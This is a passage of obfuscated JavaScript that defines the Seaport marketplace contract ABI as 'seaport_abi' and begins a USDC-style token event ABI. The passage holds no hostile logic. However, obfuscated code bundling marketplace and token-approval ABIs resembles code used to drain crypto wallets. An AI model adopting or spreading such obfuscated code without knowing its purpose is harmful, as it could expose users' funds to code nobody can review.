    name: "availableOrders",
    type: "bool[]",
  },
  _0x38b9c8 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x266217 = { internalType: "address", name: "token", type: "address" },
  _0x127680 = { internalType: "uint256", name: "identifier", type: "uint256" },
  _0x2469fe = { internalType: "uint256", name: "amount", type: "uint256" },
  _0x3c50a6 = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x5bb4c8 = {};
(_0x5bb4c8.components = [
  _0x38b9c8,
  _0x266217,
  _0x127680,
  _0x2469fe,
  _0x3c50a6,
]),
  (_0x5bb4c8.internalType = "struct ReceivedItem"),
  (_0x5bb4c8.name = "item"),
  (_0x5bb4c8.type = "tuple");
const _0x3684d0 = { internalType: "address", name: "offerer", type: "address" },
  _0xf82f8c = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x229fdb = {};
(_0x229fdb.components = [_0x5bb4c8, _0x3684d0, _0xf82f8c]),
  (_0x229fdb.internalType = "struct Execution[]"),
  (_0x229fdb.name = "executions"),
  (_0x229fdb.type = "tuple[]");
const _0x53ed93 = {};
(_0x53ed93.inputs = [_0x252f10, _0x5b76b6, _0x2c9b94, _0x2e926f, _0x2332a9]),
  (_0x53ed93.name = "fulfillAvailableOrders"),
  (_0x53ed93.outputs = [_0x2bd820, _0x229fdb]),
  (_0x53ed93.stateMutability = "payable"),
  (_0x53ed93.type = "function");
const _0x2f5ae5 = {
    internalType: "address",
    name: "considerationToken",
    type: "address",
  },
  _0xfacf1d = {
    internalType: "uint256",
    name: "considerationIdentifier",
    type: "uint256",
  },
  _0x168ae6 = {
    internalType: "uint256",
    name: "considerationAmount",
    type: "uint256",
  },
  _0x5c911a = {
    internalType: "address payable",
    name: "offerer",
    type: "address",
  },
  _0x5e1f4c = { internalType: "address", name: "zone", type: "address" },
  _0x4a3c41 = { internalType: "address", name: "offerToken", type: "address" },
  _0x1e1a08 = {
    internalType: "uint256",
    name: "offerIdentifier",
    type: "uint256",
  },
  _0x3324d2 = { internalType: "uint256", name: "offerAmount", type: "uint256" },
  _0x2c09e1 = {
    internalType: "enum BasicOrderType",
    name: "basicOrderType",
    type: "uint8",
  },
  _0x22ad93 = { internalType: "uint256", name: "startTime", type: "uint256" },
  _0x164627 = { internalType: "uint256", name: "endTime", type: "uint256" },
  _0x233bdc = { internalType: "bytes32", name: "zoneHash", type: "bytes32" },
  _0x24ae01 = { internalType: "uint256", name: "salt", type: "uint256" },
  _0x5f32b8 = {
    internalType: "bytes32",
    name: "offererConduitKey",
    type: "bytes32",
  },
  _0x3f072f = {
    internalType: "bytes32",
    name: "fulfillerConduitKey",
    type: "bytes32",
  },
  _0x373b7f = {
    internalType: "uint256",
    name: "totalOriginalAdditionalRecipients",
    type: "uint256",
  },
  _0xd814f0 = { internalType: "uint256", name: "amount", type: "uint256" },
  _0xffe178 = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x15b3d4 = {};
(_0x15b3d4.components = [_0xd814f0, _0xffe178]),
  (_0x15b3d4.internalType = "struct AdditionalRecipient[]"),
  (_0x15b3d4.name = "additionalRecipients"),
  (_0x15b3d4.type = "tuple[]");
const _0x1e38a8 = { internalType: "bytes", name: "signature", type: "bytes" },
  _0x1e1ea8 = {};
(_0x1e1ea8.components = [
  _0x2f5ae5,
  _0xfacf1d,
  _0x168ae6,
  _0x5c911a,
  _0x5e1f4c,
  _0x4a3c41,
  _0x1e1a08,
  _0x3324d2,
  _0x2c09e1,
  _0x22ad93,
  _0x164627,
  _0x233bdc,
  _0x24ae01,
  _0x5f32b8,
  _0x3f072f,
  _0x373b7f,
  _0x15b3d4,
  _0x1e38a8,
]),
  (_0x1e1ea8.internalType = "struct BasicOrderParameters"),
  (_0x1e1ea8.name = "parameters"),
  (_0x1e1ea8.type = "tuple");
const _0x2407bd = { internalType: "bool", name: "fulfilled", type: "bool" },
  _0x434218 = {};
(_0x434218.inputs = [_0x1e1ea8]),
  (_0x434218.name = "fulfillBasicOrder"),
  (_0x434218.outputs = [_0x2407bd]),
  (_0x434218.stateMutability = "payable"),
  (_0x434218.type = "function");
const _0x3ae3c1 = { internalType: "address", name: "offerer", type: "address" },
  _0x2c2136 = { internalType: "address", name: "zone", type: "address" },
  _0x2de5db = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x2abb41 = { internalType: "address", name: "token", type: "address" },
  _0x545e41 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x34206d = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x5455f0 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x523d6c = {};
(_0x523d6c.components = [
  _0x2de5db,
  _0x2abb41,
  _0x545e41,
  _0x34206d,
  _0x5455f0,
]),
  (_0x523d6c.internalType = "struct OfferItem[]"),
  (_0x523d6c.name = "offer"),
  (_0x523d6c.type = "tuple[]");
const _0x463269 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x42dc52 = { internalType: "address", name: "token", type: "address" },
  _0x2211e6 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x333fca = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x3317db = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x39f861 = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x27f4c4 = {};
(_0x27f4c4.components = [
  _0x463269,
  _0x42dc52,
  _0x2211e6,
  _0x333fca,
  _0x3317db,
  _0x39f861,
]),
  (_0x27f4c4.internalType = "struct ConsiderationItem[]"),
  (_0x27f4c4.name = "consideration"),
  (_0x27f4c4.type = "tuple[]");
const _0x28d85e = {
    internalType: "enum OrderType",
    name: "orderType",
    type: "uint8",
  },
  _0x112ba0 = { internalType: "uint256", name: "startTime", type: "uint256" },
  _0x462e17 = { internalType: "uint256", name: "endTime", type: "uint256" },
  _0x4b7d35 = { internalType: "bytes32", name: "zoneHash", type: "bytes32" },
  _0x24ed87 = { internalType: "uint256", name: "salt", type: "uint256" },
  _0x5d9f5c = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x232f7c = {
    internalType: "uint256",
    name: "totalOriginalConsiderationItems",
    type: "uint256",
  },
  _0x14b2fa = {};
(_0x14b2fa.components = [
  _0x3ae3c1,
  _0x2c2136,
  _0x523d6c,
  _0x27f4c4,
  _0x28d85e,
  _0x112ba0,
  _0x462e17,
  _0x4b7d35,
  _0x24ed87,
  _0x5d9f5c,
  _0x232f7c,
]),
  (_0x14b2fa.internalType = "struct OrderParameters"),
  (_0x14b2fa.name = "parameters"),
  (_0x14b2fa.type = "tuple");
const _0x2c55ed = { internalType: "bytes", name: "signature", type: "bytes" },
  _0x166d0f = {};
(_0x166d0f.components = [_0x14b2fa, _0x2c55ed]),
  (_0x166d0f.internalType = "struct Order"),
  (_0x166d0f.name = "order"),
  (_0x166d0f.type = "tuple");
const _0x5e7584 = {
    internalType: "bytes32",
    name: "fulfillerConduitKey",
    type: "bytes32",
  },
  _0x35f3a8 = { internalType: "bool", name: "fulfilled", type: "bool" },
  _0x37ebe7 = {};
(_0x37ebe7.inputs = [_0x166d0f, _0x5e7584]),
  (_0x37ebe7.name = "fulfillOrder"),
  (_0x37ebe7.outputs = [_0x35f3a8]),
  (_0x37ebe7.stateMutability = "payable"),
  (_0x37ebe7.type = "function");
const _0x7b74b1 = { internalType: "address", name: "offerer", type: "address" },
  _0x1b9582 = { internalType: "uint256", name: "counter", type: "uint256" },
  _0x380aaa = {};
(_0x380aaa.inputs = [_0x7b74b1]),
  (_0x380aaa.name = "getCounter"),
  (_0x380aaa.outputs = [_0x1b9582]),
  (_0x380aaa.stateMutability = "view"),
  (_0x380aaa.type = "function");
const _0x22e296 = { internalType: "address", name: "offerer", type: "address" },
  _0x234eac = { internalType: "address", name: "zone", type: "address" },
  _0x36f1a6 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0xf0fb81 = { internalType: "address", name: "token", type: "address" },
  _0x474325 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x30361d = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x4bca42 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x557865 = {};
(_0x557865.components = [
  _0x36f1a6,
  _0xf0fb81,
  _0x474325,
  _0x30361d,
  _0x4bca42,
]),
  (_0x557865.internalType = "struct OfferItem[]"),
  (_0x557865.name = "offer"),
  (_0x557865.type = "tuple[]");
const _0x1e7dfd = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x2e661f = { internalType: "address", name: "token", type: "address" },
  _0x24d5c8 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x448b8b = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0xa42d0d = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x4d05cb = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x40e2d9 = {};
(_0x40e2d9.components = [
  _0x1e7dfd,
  _0x2e661f,
  _0x24d5c8,
  _0x448b8b,
  _0xa42d0d,
  _0x4d05cb,
]),
  (_0x40e2d9.internalType = "struct ConsiderationItem[]"),
  (_0x40e2d9.name = "consideration"),
  (_0x40e2d9.type = "tuple[]");
const _0xcb97fa = {
    internalType: "enum OrderType",
    name: "orderType",
    type: "uint8",
  },
  _0x407bdd = { internalType: "uint256", name: "startTime", type: "uint256" },
  _0x5142f5 = { internalType: "uint256", name: "endTime", type: "uint256" },
  _0x1cb68a = { internalType: "bytes32", name: "zoneHash", type: "bytes32" },
  _0x25d658 = { internalType: "uint256", name: "salt", type: "uint256" },
  _0x5ad3a1 = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x19e92c = { internalType: "uint256", name: "counter", type: "uint256" },
  _0x3494e9 = {};
(_0x3494e9.components = [
  _0x22e296,
  _0x234eac,
  _0x557865,
  _0x40e2d9,
  _0xcb97fa,
  _0x407bdd,
  _0x5142f5,
  _0x1cb68a,
  _0x25d658,
  _0x5ad3a1,
  _0x19e92c,
]),
  (_0x3494e9.internalType = "struct OrderComponents"),
  (_0x3494e9.name = "order"),
  (_0x3494e9.type = "tuple");
const _0x3c42e1 = {
    internalType: "bytes32",
    name: "orderHash",
    type: "bytes32",
  },
  _0x5b2206 = {};
(_0x5b2206.inputs = [_0x3494e9]),
  (_0x5b2206.name = "getOrderHash"),
  (_0x5b2206.outputs = [_0x3c42e1]),
  (_0x5b2206.stateMutability = "view"),
  (_0x5b2206.type = "function");
const _0x3ee4a1 = {
    internalType: "bytes32",
    name: "orderHash",
    type: "bytes32",
  },
  _0x3a720c = { internalType: "bool", name: "isValidated", type: "bool" },
  _0x18ea85 = { internalType: "bool", name: "isCancelled", type: "bool" },
  _0x5dc878 = { internalType: "uint256", name: "totalFilled", type: "uint256" },
  _0x62a9fd = { internalType: "uint256", name: "totalSize", type: "uint256" },
  _0x12d5c8 = {};
(_0x12d5c8.inputs = [_0x3ee4a1]),
  (_0x12d5c8.name = "getOrderStatus"),
  (_0x12d5c8.outputs = [_0x3a720c, _0x18ea85, _0x5dc878, _0x62a9fd]),
  (_0x12d5c8.stateMutability = "view"),
  (_0x12d5c8.type = "function");
const _0x5e89eb = {
    internalType: "uint256",
    name: "newCounter",
    type: "uint256",
  },
  _0x2553bc = { inputs: [], name: "incrementCounter" };
(_0x2553bc.outputs = [_0x5e89eb]),
  (_0x2553bc.stateMutability = "nonpayable"),
  (_0x2553bc.type = "function");
const _0x361961 = { internalType: "string", name: "version", type: "string" },
  _0x1b8839 = {
    internalType: "bytes32",
    name: "domainSeparator",
    type: "bytes32",
  },
  _0x95a75d = {
    internalType: "address",
    name: "conduitController",
    type: "address",
  },
  _0x5d0637 = { inputs: [], name: "information" };
(_0x5d0637.outputs = [_0x361961, _0x1b8839, _0x95a75d]),
  (_0x5d0637.stateMutability = "view"),
  (_0x5d0637.type = "function");
const _0x5861a9 = { internalType: "address", name: "offerer", type: "address" },
  _0x9c4db4 = { internalType: "address", name: "zone", type: "address" },
  _0x2efd3d = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x473ac9 = { internalType: "address", name: "token", type: "address" },
  _0x20bdfa = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x22dbfe = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x3bebb6 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x345a4a = {};
(_0x345a4a.components = [
  _0x2efd3d,
  _0x473ac9,
  _0x20bdfa,
  _0x22dbfe,
  _0x3bebb6,
]),
  (_0x345a4a.internalType = "struct OfferItem[]"),
  (_0x345a4a.name = "offer"),
  (_0x345a4a.type = "tuple[]");
const _0x3b9300 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x4d38b4 = { internalType: "address", name: "token", type: "address" },
  _0x4c0271 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x2df1b7 = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x366e36 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x32d1dc = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x160c00 = {};
(_0x160c00.components = [
  _0x3b9300,
  _0x4d38b4,
  _0x4c0271,
  _0x2df1b7,
  _0x366e36,
  _0x32d1dc,
]),
  (_0x160c00.internalType = "struct ConsiderationItem[]"),
  (_0x160c00.name = "consideration"),
  (_0x160c00.type = "tuple[]");
const _0x454af6 = {
    internalType: "enum OrderType",
    name: "orderType",
    type: "uint8",
  },
  _0x265bde = { internalType: "uint256", name: "startTime", type: "uint256" },
  _0x102438 = { internalType: "uint256", name: "endTime", type: "uint256" },
  _0x531c88 = { internalType: "bytes32", name: "zoneHash", type: "bytes32" },
  _0x15ce98 = { internalType: "uint256", name: "salt", type: "uint256" },
  _0x21c69d = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x589c46 = {
    internalType: "uint256",
    name: "totalOriginalConsiderationItems",
    type: "uint256",
  },
  _0x5309c7 = {};
(_0x5309c7.components = [
  _0x5861a9,
  _0x9c4db4,
  _0x345a4a,
  _0x160c00,
  _0x454af6,
  _0x265bde,
  _0x102438,
  _0x531c88,
  _0x15ce98,
  _0x21c69d,
  _0x589c46,
]),
  (_0x5309c7.internalType = "struct OrderParameters"),
  (_0x5309c7.name = "parameters"),
  (_0x5309c7.type = "tuple");
const _0x53d000 = {
    internalType: "uint120",
    name: "numerator",
    type: "uint120",
  },
  _0x3bc5d7 = { internalType: "uint120", name: "denominator", type: "uint120" },
  _0x473b3c = { internalType: "bytes", name: "signature", type: "bytes" },
  _0x5bf489 = { internalType: "bytes", name: "extraData", type: "bytes" },
  _0xd7e368 = {};
(_0xd7e368.components = [
  _0x5309c7,
  _0x53d000,
  _0x3bc5d7,
  _0x473b3c,
  _0x5bf489,
]),
  (_0xd7e368.internalType = "struct AdvancedOrder[]"),
  (_0xd7e368.name = "advancedOrders"),
  (_0xd7e368.type = "tuple[]");
const _0xa88bea = {
    internalType: "uint256",
    name: "orderIndex",
    type: "uint256",
  },
  _0x598a00 = { internalType: "enum Side", name: "side", type: "uint8" },
  _0x1fb125 = { internalType: "uint256", name: "index", type: "uint256" },
  _0xb3ae9e = { internalType: "uint256", name: "identifier", type: "uint256" },
  _0x5f15ce = {
    internalType: "bytes32[]",
    name: "criteriaProof",
    type: "bytes32[]",
  },
  _0x2f5250 = {};
(_0x2f5250.components = [
  _0xa88bea,
  _0x598a00,
  _0x1fb125,
  _0xb3ae9e,
  _0x5f15ce,
]),
  (_0x2f5250.internalType = "struct CriteriaResolver[]"),
  (_0x2f5250.name = "criteriaResolvers"),
  (_0x2f5250.type = "tuple[]");
const _0xda2cdc = {
    internalType: "uint256",
    name: "orderIndex",
    type: "uint256",
  },
  _0x4b3940 = { internalType: "uint256", name: "itemIndex", type: "uint256" },
  _0x5f3f84 = {};
(_0x5f3f84.components = [_0xda2cdc, _0x4b3940]),
  (_0x5f3f84.internalType = "struct FulfillmentComponent[]"),
  (_0x5f3f84.name = "offerComponents"),
  (_0x5f3f84.type = "tuple[]");
const _0x4b81ad = {
    internalType: "uint256",
    name: "orderIndex",
    type: "uint256",
  },
  _0x36111c = { internalType: "uint256", name: "itemIndex", type: "uint256" },
  _0x3b8c04 = {};
(_0x3b8c04.components = [_0x4b81ad, _0x36111c]),
  (_0x3b8c04.internalType = "struct FulfillmentComponent[]"),
  (_0x3b8c04.name = "considerationComponents"),
  (_0x3b8c04.type = "tuple[]");
const _0x2579d9 = {};
(_0x2579d9.components = [_0x5f3f84, _0x3b8c04]),
  (_0x2579d9.internalType = "struct Fulfillment[]"),
  (_0x2579d9.name = "fulfillments"),
  (_0x2579d9.type = "tuple[]");
const _0x4fd0c2 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x3c6ee3 = { internalType: "address", name: "token", type: "address" },
  _0xe16745 = { internalType: "uint256", name: "identifier", type: "uint256" },
  _0x499bcc = { internalType: "uint256", name: "amount", type: "uint256" },
  _0xe21f75 = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x26f8c4 = {};
(_0x26f8c4.components = [
  _0x4fd0c2,
  _0x3c6ee3,
  _0xe16745,
  _0x499bcc,
  _0xe21f75,
]),
  (_0x26f8c4.internalType = "struct ReceivedItem"),
  (_0x26f8c4.name = "item"),
  (_0x26f8c4.type = "tuple");
const _0x7c1aa0 = { internalType: "address", name: "offerer", type: "address" },
  _0x1211be = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x31ca87 = {};
(_0x31ca87.components = [_0x26f8c4, _0x7c1aa0, _0x1211be]),
  (_0x31ca87.internalType = "struct Execution[]"),
  (_0x31ca87.name = "executions"),
  (_0x31ca87.type = "tuple[]");
const _0xe2414e = {};
(_0xe2414e.inputs = [_0xd7e368, _0x2f5250, _0x2579d9]),
  (_0xe2414e.name = "matchAdvancedOrders"),
  (_0xe2414e.outputs = [_0x31ca87]),
  (_0xe2414e.stateMutability = "payable"),
  (_0xe2414e.type = "function");
const _0xf2dba3 = { internalType: "address", name: "offerer", type: "address" },
  _0x206a82 = { internalType: "address", name: "zone", type: "address" },
  _0x36c978 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0xcd44c3 = { internalType: "address", name: "token", type: "address" },
  _0xb68e79 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x33ca43 = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x3a7c9a = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x416f42 = {};
(_0x416f42.components = [
  _0x36c978,
  _0xcd44c3,
  _0xb68e79,
  _0x33ca43,
  _0x3a7c9a,
]),
  (_0x416f42.internalType = "struct OfferItem[]"),
  (_0x416f42.name = "offer"),
  (_0x416f42.type = "tuple[]");
const _0x3aed8a = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x2f109c = { internalType: "address", name: "token", type: "address" },
  _0xc93153 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x4c99f5 = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x147a5b = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x221212 = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0xd4698c = {};
(_0xd4698c.components = [
  _0x3aed8a,
  _0x2f109c,
  _0xc93153,
  _0x4c99f5,
  _0x147a5b,
  _0x221212,
]),
  (_0xd4698c.internalType = "struct ConsiderationItem[]"),
  (_0xd4698c.name = "consideration"),
  (_0xd4698c.type = "tuple[]");
const _0x44a029 = {
    internalType: "enum OrderType",
    name: "orderType",
    type: "uint8",
  },
  _0x5f4b67 = { internalType: "uint256", name: "startTime", type: "uint256" },
  _0x50ddf9 = { internalType: "uint256", name: "endTime", type: "uint256" },
  _0x22dca5 = { internalType: "bytes32", name: "zoneHash", type: "bytes32" },
  _0x85f058 = { internalType: "uint256", name: "salt", type: "uint256" },
  _0x3fdcfe = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x39993f = {
    internalType: "uint256",
    name: "totalOriginalConsiderationItems",
    type: "uint256",
  },
  _0xda6ddf = {};
(_0xda6ddf.components = [
  _0xf2dba3,
  _0x206a82,
  _0x416f42,
  _0xd4698c,
  _0x44a029,
  _0x5f4b67,
  _0x50ddf9,
  _0x22dca5,
  _0x85f058,
  _0x3fdcfe,
  _0x39993f,
]),
  (_0xda6ddf.internalType = "struct OrderParameters"),
  (_0xda6ddf.name = "parameters"),
  (_0xda6ddf.type = "tuple");
const _0xbe742f = { internalType: "bytes", name: "signature", type: "bytes" },
  _0x1bd0b7 = {};
(_0x1bd0b7.components = [_0xda6ddf, _0xbe742f]),
  (_0x1bd0b7.internalType = "struct Order[]"),
  (_0x1bd0b7.name = "orders"),
  (_0x1bd0b7.type = "tuple[]");
const _0xcb28d5 = {
    internalType: "uint256",
    name: "orderIndex",
    type: "uint256",
  },
  _0x3a147d = { internalType: "uint256", name: "itemIndex", type: "uint256" },
  _0x3cbc2b = {};
(_0x3cbc2b.components = [_0xcb28d5, _0x3a147d]),
  (_0x3cbc2b.internalType = "struct FulfillmentComponent[]"),
  (_0x3cbc2b.name = "offerComponents"),
  (_0x3cbc2b.type = "tuple[]");
const _0x129390 = {
    internalType: "uint256",
    name: "orderIndex",
    type: "uint256",
  },
  _0x1b05c6 = { internalType: "uint256", name: "itemIndex", type: "uint256" },
  _0x20aced = {};
(_0x20aced.components = [_0x129390, _0x1b05c6]),
  (_0x20aced.internalType = "struct FulfillmentComponent[]"),
  (_0x20aced.name = "considerationComponents"),
  (_0x20aced.type = "tuple[]");
const _0x20ba65 = {};
(_0x20ba65.components = [_0x3cbc2b, _0x20aced]),
  (_0x20ba65.internalType = "struct Fulfillment[]"),
  (_0x20ba65.name = "fulfillments"),
  (_0x20ba65.type = "tuple[]");
const _0x457b38 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x4614c5 = { internalType: "address", name: "token", type: "address" },
  _0x485423 = { internalType: "uint256", name: "identifier", type: "uint256" },
  _0x15d03f = { internalType: "uint256", name: "amount", type: "uint256" },
  _0x403085 = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x594d10 = {};
(_0x594d10.components = [
  _0x457b38,
  _0x4614c5,
  _0x485423,
  _0x15d03f,
  _0x403085,
]),
  (_0x594d10.internalType = "struct ReceivedItem"),
  (_0x594d10.name = "item"),
  (_0x594d10.type = "tuple");
const _0x166b84 = { internalType: "address", name: "offerer", type: "address" },
  _0x1c87d3 = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x467850 = {};
(_0x467850.components = [_0x594d10, _0x166b84, _0x1c87d3]),
  (_0x467850.internalType = "struct Execution[]"),
  (_0x467850.name = "executions"),
  (_0x467850.type = "tuple[]");
const _0x152d64 = {};
(_0x152d64.inputs = [_0x1bd0b7, _0x20ba65]),
  (_0x152d64.name = "matchOrders"),
  (_0x152d64.outputs = [_0x467850]),
  (_0x152d64.stateMutability = "payable"),
  (_0x152d64.type = "function");
const _0x234f3f = {
    internalType: "string",
    name: "contractName",
    type: "string",
  },
  _0x3f5c31 = { inputs: [], name: "name" };
(_0x3f5c31.outputs = [_0x234f3f]),
  (_0x3f5c31.stateMutability = "pure"),
  (_0x3f5c31.type = "function");
const _0x1cf0a8 = { internalType: "address", name: "offerer", type: "address" },
  _0x4981a5 = { internalType: "address", name: "zone", type: "address" },
  _0x1fe1aa = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x21077d = { internalType: "address", name: "token", type: "address" },
  _0x137399 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x3a42a6 = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x29c1e3 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x5c6918 = {};
(_0x5c6918.components = [
  _0x1fe1aa,
  _0x21077d,
  _0x137399,
  _0x3a42a6,
  _0x29c1e3,
]),
  (_0x5c6918.internalType = "struct OfferItem[]"),
  (_0x5c6918.name = "offer"),
  (_0x5c6918.type = "tuple[]");
const _0x589ee4 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x1a9329 = { internalType: "address", name: "token", type: "address" },
  _0x3808ed = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x50955f = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x139057 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x18a5e8 = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x409344 = {};
(_0x409344.components = [
  _0x589ee4,
  _0x1a9329,
  _0x3808ed,
  _0x50955f,
  _0x139057,
  _0x18a5e8,
]),
  (_0x409344.internalType = "struct ConsiderationItem[]"),
  (_0x409344.name = "consideration"),
  (_0x409344.type = "tuple[]");
const _0x44b773 = {
    internalType: "enum OrderType",
    name: "orderType",
    type: "uint8",
  },
  _0x28a5e8 = { internalType: "uint256", name: "startTime", type: "uint256" },
  _0x51d21d = { internalType: "uint256", name: "endTime", type: "uint256" },
  _0x1e1c06 = { internalType: "bytes32", name: "zoneHash", type: "bytes32" },
  _0x2ed259 = { internalType: "uint256", name: "salt", type: "uint256" },
  _0x525a8a = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x300ad7 = {
    internalType: "uint256",
    name: "totalOriginalConsiderationItems",
    type: "uint256",
  },
  _0x2f7a86 = {};
(_0x2f7a86.components = [
  _0x1cf0a8,
  _0x4981a5,
  _0x5c6918,
  _0x409344,
  _0x44b773,
  _0x28a5e8,
  _0x51d21d,
  _0x1e1c06,
  _0x2ed259,
  _0x525a8a,
  _0x300ad7,
]),
  (_0x2f7a86.internalType = "struct OrderParameters"),
  (_0x2f7a86.name = "parameters"),
  (_0x2f7a86.type = "tuple");
const _0x5f0e3e = { internalType: "bytes", name: "signature", type: "bytes" },
  _0x4c55ea = {};
(_0x4c55ea.components = [_0x2f7a86, _0x5f0e3e]),
  (_0x4c55ea.internalType = "struct Order[]"),
  (_0x4c55ea.name = "orders"),
  (_0x4c55ea.type = "tuple[]");
const _0x1864e9 = { internalType: "bool", name: "validated", type: "bool" },
  _0x2f8a58 = {};
(_0x2f8a58.inputs = [_0x4c55ea]),
  (_0x2f8a58.name = "validate"),
  (_0x2f8a58.outputs = [_0x1864e9]),
  (_0x2f8a58.stateMutability = "nonpayable"),
  (_0x2f8a58.type = "function");
var seaport_abi = [
  _0x31d358,
  _0x50d460,
  _0x2eb454,
  _0x3e60cd,
  _0x3f1729,
  _0x1e914e,
  _0x52cbff,
  _0x11c122,
  _0x22f0e3,
  _0x33db42,
  _0x201903,
  _0x376588,
  _0x5e1877,
  _0x112584,
  _0x5621e8,
  _0x269443,
  _0x57e10f,
  _0x78451a,
  _0x28c8ae,
  _0xb39577,
  _0x3a8475,
  _0x2081e2,
  _0x20ba14,
  _0x4de4b3,
  _0x69d48b,
  _0x221fc7,
  _0x316584,
  _0x1d0685,
  _0x132e9f,
  _0x415d1a,
  _0x226ccd,
  _0x574dc9,
  _0x15724a,
  _0x11e1d0,
  _0x2f2537,
  _0x198c83,
  _0x238470,
  _0x288030,
  _0x8f2822,
  _0x579a2d,
  _0xb8ec39,
  _0x5593f7,
  _0x238c07,
  _0x179db2,
  _0x25d1b2,
  _0x373122,
  _0xfce427,
  _0x462bb7,
  _0x30a7ec,
  _0x974882,
  _0xe32c8b,
  _0x53ed93,
  _0x434218,
  _0x37ebe7,
  _0x380aaa,
  _0x5b2206,
  _0x12d5c8,
  _0x2553bc,
  _0x5d0637,
  _0xe2414e,
  _0x152d64,
  _0x3f5c31,
  _0x2f8a58,
];
const _0x2985dc = {
    indexed: !0,
    internalType: "address",
    name: "owner",
    type: "address",
  },
  _0x9b282 = {
    indexed: !0,
    internalType: "address",
    name: "spender",
    type: "address",
  },
  _0x35a274 = {
    indexed: !1,
    internalType: "uint256",
    name: "value",
    type: "uint256",
  },
  _0x268d81 = { anonymous: !1 };
(_0x268d81.inputs = [_0x2985dc, _0x9b282, _0x35a274]),
  (_0x268d81.name = "Approval"),
  (_0x268d81.type = "event");
const _0x42f2b6 = {
    indexed: !0,
    internalType: "address",
    name: "authorizer",
    type: "address",
  },
  _0x2034a5 = {
    indexed: !0,
    internalType: "bytes32",
    name: "nonce",
    type: "bytes32",
  },
  _0x2dfbc1 = { anonymous: !1 };
(_0x2dfbc1.inputs = [_0x42f2b6, _0x2034a5]),
  (_0x2dfbc1.name = "AuthorizationCanceled"),
  (_0x2dfbc1.type = "event");
const _0x1f6821 = {
    indexed: !0,
    internalType: "address",
    name: "authorizer",
    type: "address",
  },
  _0xe39cd1 = {
    indexed: !0,
    internalType: "bytes32",
    name: "nonce",
    type: "bytes32",
  },
  _0x3b3d46 = { anonymous: !1 };
(_0x3b3d46.inputs = [_0x1f6821, _0xe39cd1]),
  (_0x3b3d46.name = "AuthorizationUsed"),
  (_0x3b3d46.type = "event");
const _0x24c415 = {
    indexed: !0,
    internalType: "address",
    name: "_account",
    type: "address",
  },
  _0x398e6d = { anonymous: !1 };
(_0x398e6d.inputs = [_0x24c415]),
  (_0x398e6d.name = "Blacklisted"),
  (_0x398e6d.type = "event");
const _0x58c5ee = {
    indexed: !0,
    internalType: "address",
    name: "newBlacklister",
    type: "address",
  },
  _0x21e3be = { anonymous: !1 };
